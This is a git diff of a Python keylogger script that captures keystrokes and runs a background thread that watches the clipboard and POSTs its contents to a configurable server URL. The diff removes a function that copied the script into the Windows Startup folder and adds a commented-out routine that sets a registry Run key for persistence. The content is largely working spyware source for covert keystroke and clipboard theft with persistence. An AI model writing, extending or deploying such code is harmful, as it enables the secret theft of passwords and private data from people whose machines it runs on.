@@ -4,11 +4,13 @@ import re
 import time
 import requests
 import pyperclip
-import shutil
+import threading
+import winreg as reg
 
                     #--Modify these--#
-######################################################## 
-url = "http://127.0.0.1:5000" 
+#######################################################
+port = 5000 
+url = f"http://127.0.0.1:{port}" 
 file_path = './file.log'
 ########################################################
 
@@ -26,7 +28,9 @@ special_keys = [keyboard.Key.space, keyboard.Key.enter, keyboard.Key.backspace, 
 
 content=''
 ########################################################
-# flag to indicate when to stop the threads
+# Global variables
+shift_pressed = False
+caps_lock_pressed = False
 exit_threads = False
 
 # function which checks for the key pressed
@@ -75,28 +79,61 @@ def copyClipboard():
     clipboard = pyperclip.paste()
     # Only send a request if the clipboard content has changed
     response = requests.post(url+'/clipboard', data=clipboard)
+ 
+# THIS MODIFIES THE REGISTRY KEYS AND IS DANGEROUS!!!   
+# def AddToRegistry():
+ 
+#     # in python __file__ is the instant of
+#     # file path where it was executed 
+#     # so if it was executed from desktop,
+#     # then __file__ will be 
+#     # c:\users\current_user\desktop
+#     pth = os.path.dirname(os.path.realpath(__file__))
+     
+#     # name of the python file with extension
+#     s_name="keylogger.py"    
+     
+#     # joins the file name to end of path address
+#     address=os.join(pth,s_name) 
+     
+#     key = reg.HKEY_CURRENT_USER
+#     key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
+     
+#     # open the key to make changes to
+#     open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
+#     reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address)
+     
+#     # now close the opened key
+#     reg.CloseKey(open)
 
-def toStart():
-    try:
-        shutil.copyfile(__file__,'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\keylogger.py')
-    except PermissionError as e:
-        print("We have a permission error")
+# Function to monitor clipboard content
+def clipboard_monitor():
+    previous_clipboard_content = None
+    while not exit_threads:
+        clipboard_content = pyperclip.paste()
+        if clipboard_content != previous_clipboard_content:
+            response = requests.post(url+'/clipboard', data=clipboard_content)
+            previous_clipboard_content = clipboard_content
+        time.sleep(1) 
 
+def test():
+    print("test")
 ################################
 #------ MAIN FUNCTION ---------#
 if __name__ == "__main__":
-    shift_pressed = False
-    caps_lock_pressed = False
-    listener = keyboard.Listener(on_press=keyPressed, on_release=keyReleased)
-    listener.start()
+    # Start key listener thread
+    key_listener_thread = threading.Thread(target=lambda: keyboard.Listener(on_press=keyPressed, on_release=keyReleased).start())
+
+    # Start clipboard monitor thread
+    clipboard_monitor_thread = threading.Thread(target=clipboard_monitor)
+
+    key_listener_thread.start()
+    clipboard_monitor_thread.start()
+
     try:
         while True:
-            copyClipboard()
-            if exit_threads:
-                break
             time.sleep(1)
-    finally:
+    except KeyboardInterrupt:
         exit_threads = True
-        listener.stop()
-        listener.join()
-        input()
+        key_listener_thread.join()
+        clipboard_monitor_thread.join()
